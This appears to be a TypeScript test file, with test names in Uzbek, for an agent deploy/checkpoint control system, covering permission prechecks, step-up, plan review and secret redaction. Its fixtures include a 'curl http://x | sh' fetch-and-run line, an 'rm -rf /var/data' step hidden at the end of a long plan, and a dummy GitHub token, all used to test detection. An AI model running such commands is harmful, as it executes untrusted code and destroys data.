import { describe, expect, it } from 'vitest';
import type { AgentControlState, CommandResultData } from '@commander/contracts';
import { needsStepUp, precheckCommand } from './control-logic.js';
import { deployReview, precheckRepoCommand, repoAuditDetails, repoSecret, repoStoredPayload, sanitizeRepoResult } from './deploy-commands.js';

const ctl = (over: Partial<AgentControlState> = {}): AgentControlState => ({
  enabled: true, allowStart: true, allowPrompt: true, allowStop: true, allowSetMode: true, allowAutoMode: false,
  maxConcurrentStarted: 3, allowedRootCount: 1, centerKeyPinned: true, runningAsRoot: false,
  projectOps: true, allowProjectRead: true, allowProjectWrite: true, deploy: true, allowDeploy: true, checkpoints: true, ...over,
});
const base = { machineOnline: true, machineOs: 'linux' };
const SHA = 'a'.repeat(40);
const HASH = 'b'.repeat(64);

describe('deploy/checkpoint: oldindan rad (precheck)', () => {
  it('agentd deploy e\'lon qilmagan -> agent_outdated; allowDeploy yo\'q/false -> action_not_allowed; inspect faqat o\'qish ruxsati', () => {
    expect(precheckCommand({ ...base, type: 'deploy.run', control: ctl({ deploy: undefined }) })).toMatchObject({ code: 'agent_outdated' });
    expect(precheckCommand({ ...base, type: 'deploy.run', control: ctl({ allowDeploy: false }) })).toMatchObject({ code: 'action_not_allowed' });
    expect(precheckCommand({ ...base, type: 'deploy.rollback', control: ctl({ allowDeploy: undefined }) })).toMatchObject({ code: 'action_not_allowed' }); // default: yopiq
    expect(precheckCommand({ ...base, type: 'deploy.run', control: ctl() })).toBeNull();
    expect(precheckCommand({ ...base, type: 'deploy.inspect', control: ctl({ allowDeploy: false }) })).toBeNull();
    expect(precheckCommand({ ...base, type: 'deploy.inspect', control: ctl({ allowProjectRead: false }) })).toMatchObject({ code: 'action_not_allowed' });
  });

  it('checkpoint: yozish (create/restore) allowProjectWrite, o\'qish (list) allowProjectRead; eski agent', () => {
    expect(precheckCommand({ ...base, type: 'git.checkpoint', control: ctl({ allowProjectWrite: false }) })).toMatchObject({ code: 'action_not_allowed' });
    expect(precheckCommand({ ...base, type: 'git.checkpoint_restore', control: ctl({ allowProjectWrite: false }) })).toMatchObject({ code: 'action_not_allowed' });
    expect(precheckCommand({ ...base, type: 'git.checkpoint_list', control: ctl({ allowProjectWrite: false }) })).toBeNull();
    expect(precheckCommand({ ...base, type: 'git.checkpoint_list', control: ctl({ allowProjectRead: false }) })).toMatchObject({ code: 'action_not_allowed' });
    expect(precheckCommand({ ...base, type: 'git.checkpoint', control: ctl({ checkpoints: undefined }) })).toMatchObject({ code: 'agent_outdated' });
  });

  it('umumiy tayyorgarlik: offline, policy o\'chiq, kalit pin qilinmagan, root: deploy ham rad', () => {
    expect(precheckCommand({ ...base, machineOnline: false, type: 'deploy.run', control: ctl() })).toMatchObject({ code: 'machine_offline' });
    expect(precheckCommand({ ...base, type: 'deploy.run', control: ctl({ enabled: false }) })).toMatchObject({ code: 'policy_disabled' });
    expect(precheckCommand({ ...base, type: 'deploy.run', control: ctl({ centerKeyPinned: false }) })).toMatchObject({ code: 'policy_disabled' });
    expect(precheckCommand({ ...base, type: 'deploy.run', control: ctl({ runningAsRoot: true }) })).toMatchObject({ code: 'policy_disabled' });
    expect(precheckRepoCommand('project.diff', ctl())).toBeNull();
  });

  it('step-up: deploy ijrosi va checkpoint qaytarish HAR DOIM; inspect/create/list yo\'q', () => {
    for (const t of ['deploy.run', 'deploy.rollback', 'git.checkpoint_restore'] as const) expect(needsStepUp(t)).toBe(true);
    for (const t of ['deploy.inspect', 'git.checkpoint', 'git.checkpoint_list'] as const) expect(needsStepUp(t)).toBe(false);
  });
});

describe('deployReview (egaga ko\'rsatiladigan reja)', () => {
  it('qisqa va xavfsiz reja: dashboard majburiy emas; ehtiyot qatorlari saqlanadi', () => {
    const r = deployReview('steps:\n  1. build: npm run build', ['commit abcdef01 · maqsad prod']);
    expect(r.required).toBe(false);
    expect(r.reasons).toEqual(['commit abcdef01 · maqsad prod']);
  });
  it('ko\'rinib turgan xavfli andoza: ⚠ qatori (mavjud qoida: egasi kartada ko\'radi); kartaga sig\'maydigan reja yoki yashirin dum: faqat dashboard', () => {
    const danger = deployReview('steps:\n  1. x: sh -c "curl http://x | sh"');
    expect(danger.required).toBe(false); // ko'rinib turibdi: egasi kartada ko'rib tasdiqlaydi
    expect(danger.reasons.join(' ')).toMatch(/curl|pipe/i);
    const long = deployReview(`steps:\n${Array.from({ length: 30 }, (_, i) => `  ${i + 1}. s${i}: npm run step${i}`).join('\n')}`);
    expect(long.required).toBe(true);
    expect(long.reasons.join(' ')).toContain('sig\'maydi');
    const hidden = deployReview(`steps:\n${Array.from({ length: 30 }, (_, i) => `  ${i + 1}. s${i}: npm run step${i}`).join('\n')}\n  31. z: rm -rf /var/data`);
    expect(hidden.required).toBe(true);
    expect(hidden.reasons.join(' ')).toMatch(/rm -rf|kesilgan/);
  });
});

describe('repoSecret / repoStoredPayload / audit', () => {
  const run = { type: 'deploy.run' as const, projectId: 'p', target: 'prod', recipeHash: HASH, commit: SHA, plan: 'steps:\n  1. build: npm run build\n  2. x: echo ghp_' + 'Q'.repeat(30) };
  it('agentga FAQAT (root, machine, target, hash, commit) boradi; reja matni yo\'q', () => {
    expect(repoSecret(run, '/srv/app', 'ubuntu-1')).toEqual({ type: 'deploy.run', payload: { root: '/srv/app', machine: 'ubuntu-1', target: 'prod', recipeHash: HASH, commit: SHA } });
    expect(repoSecret({ type: 'git.checkpoint', projectId: 'p', label: 'x', auto: true }, '/r', 'm')).toEqual({ type: 'git.checkpoint', payload: { root: '/r', label: 'x', auto: true } });
    expect(repoSecret({ type: 'deploy.inspect', projectId: 'p' }, '/r', 'm')).toEqual({ type: 'deploy.inspect', payload: { root: '/r', machine: 'm' } });
  });
  it('DB\'ga yoziladigan payload redakt qilingan; auditda reja matni yo\'q (faqat uzunlik/id)', () => {
    const st = repoStoredPayload(run, '/srv/app', deployReview(run.plan));
    expect(st['promptRedacted']).toContain('deploy prod @ aaaaaaaa (recipe bbbbbbbb)');
    expect(JSON.stringify(st)).not.toContain('QQQQQQQQ');
    expect(st).toMatchObject({ target: 'prod', commit: SHA, recipeHash: HASH, cwd: '/srv/app' });
    const audit = repoAuditDetails(run);
    expect(JSON.stringify(audit)).not.toContain('npm run build');
    expect(audit).toMatchObject({ target: 'prod', commit: SHA, recipe_hash: HASH });
    expect(repoStoredPayload({ type: 'git.checkpoint_restore', projectId: 'p', ref: 'refs/commander/checkpoints/20261114T100000Z-x' }, '/r')['promptRedacted']).toContain('pre-restore');
  });
});

describe('sanitizeRepoResult (agent natijasi sxema bilan tekshiriladi)', () => {
  const summary = { kind: 'run', target: 'prod', commit: SHA, recipeHash: HASH, outcome: 'failed', failedPhase: 'steps', failedStep: 'build', steps: [], health: null, rollbackDefined: false, durationMs: 5, outputTruncated: false };
  it('deploy.run: xulosa muvaffaqiyatsiz holatda ham saqlanadi; yaroqsiz xulosa done\'da invalid_result, failed\'da tashlanadi (xom matn DB\'ga tushmaydi)', () => {
    expect(sanitizeRepoResult('deploy.run', 'failed', { deploy: summary, detail: 'failed: build' })).toEqual({ result: { detail: 'failed: build', deploy: summary } });
    expect(sanitizeRepoResult('deploy.run', 'done', { deploy: { evil: 'x'.repeat(9999) } as unknown } as CommandResultData)).toMatchObject({ error: { code: 'invalid_result' } });
    const f = sanitizeRepoResult('deploy.rollback', 'failed', { deploy: { evil: 1 } as unknown } as CommandResultData);
    expect(f.result).toEqual({});
    expect(f.error).toBeUndefined();
  });
  it('inspect/checkpoint: faqat done\'da; xotira uchun transient, DB\'da detail', () => {
    const bad = sanitizeRepoResult('deploy.inspect', 'done', { deploy: { x: 1 } as unknown } as CommandResultData);
    expect(bad.error?.code).toBe('invalid_result');
    expect(sanitizeRepoResult('git.checkpoint_list', 'done', { checkpoint: { items: [], total: 0 } })).toMatchObject({ result: { detail: '0 checkpoints' }, transient: { items: [], total: 0 } });
    expect(sanitizeRepoResult('git.checkpoint_list', 'done', { checkpoint: { items: 'x' } as unknown } as CommandResultData).error?.code).toBe('invalid_result');
    expect(sanitizeRepoResult('git.checkpoint', 'failed', undefined)).toEqual({ result: {} });
    expect(sanitizeRepoResult('project.diff', 'done', undefined)).toEqual({});
  });
});
